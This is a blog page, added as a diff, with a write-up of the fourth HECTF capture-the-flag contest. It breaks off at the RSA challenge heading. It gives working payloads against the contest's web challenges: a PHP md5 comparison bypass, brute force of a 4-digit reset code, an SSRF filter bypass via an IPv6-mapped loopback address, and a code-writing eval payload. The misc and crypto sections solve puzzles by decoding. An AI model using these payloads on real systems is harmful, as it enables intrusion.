@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    第四届HECTF write up |  
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-第四届HECTF write up"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  第四届HECTF write up
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/11/22/%E7%AC%AC%E5%9B%9B%E5%B1%8AHECTF%20write%20up/" class="article-date">
+  <time datetime="2020-11-22T13:00:00.000Z" itemprop="datePublished">2020-11-22</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9Bwriteup/">比赛writeup</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">8 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>题目：蛾子！你怎么跑到了。。。。php上？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">$string_1 = $_GET[<span class="string">&#x27;str1&#x27;</span>]; </span><br><span class="line">$string_2 = $_GET[<span class="string">&#x27;str2&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;param1&#x27;</span>]!==$_GET[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_GET[<span class="string">&#x27;param1&#x27;</span>])===md5($_GET[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($string_1))&#123; </span><br><span class="line">        $md5_1 = md5($string_1); </span><br><span class="line">        $md5_2 = md5($string_2); </span><br><span class="line">        <span class="keyword">if</span>($md5_1 != $md5_2)&#123; </span><br><span class="line">            $a = strtr($md5_1, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">            $b = strtr($md5_2, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">            <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;you are close&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;md5 is wrong&quot;</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;str1 not number&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are wrong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<p>利用md5()不能加密数组，加密数组会返回false，所以<code>param1</code>和<code>param2</code>传值为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]&#x3D;1&amp;param2[]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p>接下要使得传进来的<code>str1</code>是纯数字，且<code>str1</code>和<code>str2</code>进行md5加密后的值不相等</p>
+<p>然后对md5加密后的值进行替换后相等，最终得到flag</p>
+<br>
+
+<p>只要是以0e开头，后面为数字的两个字符串相等，所以</p>
+<p><code>$a == $b</code>这里可以考虑这样绕过</p>
+<p>纯数字的字符串md5加密后符合**<code>0e\d+</code>**的有<code>240610708</code>，即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;240610708</span><br></pre></td></tr></table></figure>
+
+<p>因为在后面的替换中，会将<code>c</code>替换为<code>0</code>，所以<code>str2</code>进行md5加密后得以<code>ce</code>开头，这样才能使得<code>str1</code>和<code>str2</code>md5加密后的值不相等，替换后又能相等</p>
+<p>而<code>str2</code>进行md5加密后，除开头的<code>ce</code>外，剩下部分只能是数字和字母cxhp</p>
+<p>写脚本进行筛选</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">10000000</span>; $i++) &#123;</span><br><span class="line">	$a = md5($i);</span><br><span class="line">	<span class="keyword">if</span>(substr($a, <span class="number">0</span>, <span class="number">2</span>) == <span class="string">&#x27;ce&#x27;</span>) &#123;</span><br><span class="line">		$end = substr($a, <span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[^0-9cxhp]/&#x27;</span>, $end)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;i=&quot;</span>.$i.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;a=&quot;</span>.$a.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i&#x3D;9427417</span><br><span class="line">a&#x3D;ce156443c7c7c4c63366466c25317636</span><br></pre></td></tr></table></figure>
+
+<p>所以<code>str2=9427417</code></p>
+<p>联合起来即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str1&#x3D;240610708&amp;str2&#x3D;9427417&amp;param1[]&#x3D;1&amp;param2[]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2020/11/21/D3aJdU.png" alt="D3aJdU.png"></p>
+<br>
+
+<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>题目：登录就送flag~</p>
+<p>hint：brute force</p>
+<p><img src="https://s3.ax1x.com/2020/11/21/D3aDL6.png"></p>
+<p>随便输个手机号和密码，提示手机或密码错误，查看源码发现手机号：<code>15970773575</code></p>
+<p><img src="https://s3.ax1x.com/2020/11/21/D3ajln.png"></p>
+<p>点击<code>忘记密码</code>，根据题目hint，使用暴力破解</p>
+<p><img src="https://s3.ax1x.com/2020/11/21/D3dtnP.png"></p>
+<p>用脚本生成4位纯数字的验证码</p>
+<ul>
+<li>4num.py</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0000</span>,<span class="number">9999</span>):</span><br><span class="line">    s = str(i).zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;4num.txt&#x27;</span>,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(str(s) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
+
+<p>用burp suite抓包，使用爆破模块进行爆破，其中<code>0233</code>的长度和其它明显不同</p>
+<p><img src="https://s3.ax1x.com/2020/11/21/D3dgBV.png"></p>
+<p>尝试后发现为正确的验证码，重设密码后重新登录即可拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;a9a102c0c06fcf6c8072c30f0a52f1f2&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h3><p>题目：绕过人海，走进服务器内心的世界。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//try flag.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$url</span>) </span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!filter($url))&#123;</span><br><span class="line">     <span class="keyword">echo</span> file_get_contents($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://www.getflag.cn/2020/10/22/%E6%B5%85%E8%B0%88ssrf%E4%B8%8Ectf%E9%82%A3%E4%BA%9B%E4%BA%8B/">【转载】浅谈ssrf与ctf那些事 | kawhi’s Blog (getflag.cn)</a></p>
+<p><img src="https://s3.ax1x.com/2020/11/21/D3w5a8.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2020/11/21/D3w7GQ.png"></p>
+<br>
+
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="【真签到题】快来看直播啦"><a href="#【真签到题】快来看直播啦" class="headerlink" title="【真签到题】快来看直播啦~"></a>【真签到题】快来看直播啦~</h3><p>题目：前往直播间，<del>调戏小蓝蓝</del>获取flag。</p>
+<p>flag在直播屏幕里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;狮虎萌轻一点打出题人好吗嘤嘤嘤&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><p>题目：好可爱的小猫咪鸭~</p>
+<p>下载后是一张图片：<code>flag.png</code></p>
+<p>拖到010 Editor里，在末尾发现这个</p>
+<p><img src="https://s3.ax1x.com/2020/11/22/D8bYa6.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M2I3OWJkZjhmY2ZkNTVmZH0&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>base64解密后得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3b79bdf8fcfd55fd&#125;</span><br></pre></td></tr></table></figure>
+
+<p>差了前半段，尝试调整图片高度，将<code>02 BC</code>改为<code>04 20</code></p>
+<p><img src="https://s3.ax1x.com/2020/11/22/D8bILn.png"></p>
+<p>在图片最下看到前半段的flag</p>
+<p><img src="https://s3.ax1x.com/2020/11/22/D8qy6J.png"></p>
+<p>合起来得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;94ed7fdae8f504743b79bdf8fcfd55fd&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="不说人话"><a href="#不说人话" class="headerlink" title="不说人话"></a>不说人话</h3><p>题目：阴阳怪气？！</p>
+<p>使用<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">Ook编解码在线工具</a>，得到flag</p>
+<p><img src="https://s3.ax1x.com/2020/11/22/D8OrL9.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;TH1s_1s_crypt0_914nda0&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SWjgzRRm8-RKCRRSrLYbRw">https://mp.weixin.qq.com/s/SWjgzRRm8-RKCRRSrLYbRw</a></p>
+<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目：Sunned是一个linux小白，突然有一天想学渗透，她请教了某大佬，大佬说，首先的你得先学会搭建环境，然后，然后，Sunned就跟着网上的教程先搭建了一个web服务器，搭建好之后大佬给她上了一个题目。</p>
+<p>hint：一个小姑娘走丢了，她的家人担心地到处找，一边找一边喊：贝丝！你在哪？？ L2V0Yy9jcm9udGFi</p>
+<p>查看源码发现</p>
+<p><img src="https://s3.ax1x.com/2020/11/21/D3wXq0.png"></p>
+<p>php弱类型比较问题，利用md5不能加密数组绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You need the file is .&#x2F;3b8cf4731c36d20776c76e20f9c774c7.php</span><br></pre></td></tr></table></figure>
+
+<p>访问该路径</p>
+<p><img src="https://s3.ax1x.com/2020/11/22/D30ks1.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">@$data&#x3D;$_POST[&#39;data&#39;];</span><br><span class="line">$file&#x3D;$_POST[&#39;file&#39;];</span><br><span class="line">if($file!&#x3D;&quot;&#x2F;xxx&quot;)</span><br><span class="line">die(&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;);</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $data)) &#123;</span><br><span class="line">echo &quot;great!!!!你需要看看源码&quot;;</span><br><span class="line">file_put_contents($file,&quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径</span><br></pre></td></tr></table></figure>
+
+<p>根据提示的<code>L2V0Yy9jcm9udGFi</code>，进行base64解码，得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure>
+
+<p>访问该路径</p>
+<p><img src="https://s3.ax1x.com/2020/11/22/D30ZdK.png"></p>
+<p>尝试传参，并访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;phpinfo();&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2020/11/22/D30GeP.png"></p>
+<p>get_defined_vars() 会返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(get_defined_vars());</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(4) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;_GET&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [&quot;_POST&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [&quot;_COOKIE&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [&quot;_FILES&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  array(0) &#123;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;eval(pos(next(get_defined_vars())));&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或：</p>
+<p>data=eval(end(current(get_defined_vars())));&amp;file=/very_g00d_Y0u_got_it.php</p>
+</blockquote>
+<p><img src="https://s3.ax1x.com/2020/11/22/D8fMgx.png"></p>
+<p><img src="https://s3.ax1x.com/2020/11/24/DUeG5R.png"></p>
+<p>执行命令</p>
+<p><img src="https://s3.ax1x.com/2020/11/24/DUmKJI.png"></p>
+<blockquote>
+<p><code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code> base64解密后为 <code>fl4ggggggggggggCg</code></p>
+<p>也可以读取<code>3b8cf4731c36d20776c76e20f9c774c7.php</code>，从注释知道flag所在文件</p>
+</blockquote>
+<p>读取<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>，得到flag</p>
+<p><img src="https://s3.ax1x.com/2020/11/24/DUm6w4.png"></p>
+<ul>
+<li><code>3b8cf4731c36d20776c76e20f9c774c7.php</code></li>
+</ul>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">@$data=$_POST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">$file=$_POST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file!=<span class="string">&quot;/xxx&quot;</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $data)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;great!!!!你需要看看源码&quot;</span>;</span><br><span class="line">file_put_contents($file,<span class="string">&quot;&lt;?php &quot;</span>.\$data.<span class="string">&quot; ?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$data=$_POST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">$file=$_POST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file!=<span class="string">&quot;/very_g00d_Y0u_got_it.php&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $data))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono &quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;great!!!!&quot;</span>;</span><br><span class="line">    @file_put_contents($file,<span class="string">&quot;&lt;?php &quot;</span>.$data.<span class="string">&quot; ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//你想要的文件是   Zmw0Z2dnZ2dnZ2dnZ2dnCg</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="在这里签到"><a href="#在这里签到" class="headerlink" title="在这里签到"></a>在这里签到</h3><p>题目：经典套娃 有手就…</p>
+<ul>
+<li>enc.txt</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX18DxoLgtTzVee++9JZw790ngjGfxdjjjeWt9m9jL2O3NJuKB&#x2F;&#x2F;4O3BHTnelg2z+o2vE0AxVKPobIFVgKxqbpkr94XYPNZFbbFykHWBMArdVT8FuH7dyvHDrLe7D35p654UEy2Yn0FepbJ7BHcn9Gu9xg7eqVcovB6KfMivcXw49JyZWbWtb0SZKpA0hRgI2tNeQ8lsRZRkoaI9CECyphItxLd0bO58phQjv70M&#x2F;e30tsFpEmPo&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>rabbit解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1E0RElOSlVHTTJUSU5CV0c1QkRHTkJUR01aVFFOUlRHWTJER05SVEdVWlRJTlJVR1laVEdPQlRHVTNES05SVkdZWlRHTkpUR0kzREdOUlZHWTJETU1KV0dJWlRJTVpaR1kyREdNWldHUVpURU5SV0dNM1RNTkpXR0UzVUk9PT0&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>base64解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GQ4DINJUGM2TINBWG5BDGNBTGMZTQNRTGY2DGNRTGUZTINRUGYZTGOBTGU3DKNRVGYZTGNJTGI3DGNRVGY2DMMJWGIZTIMZZGY2DGMZWGQZTENRWGM3TMNJWGE3UI&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>base32解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48454354467B34333863643635346463383565656335326365646162343964336432663765617D</span><br></pre></td></tr></table></figure>
+
+<p>十六进制转字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;438cd654dc85eec52cedab49d3d2f7ea&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>题目：RRRRRRRSSSSSSSSAAAAAAA<del>~</del></p>
+<ul>
+<li>rsa.txt</li>
+</ul>
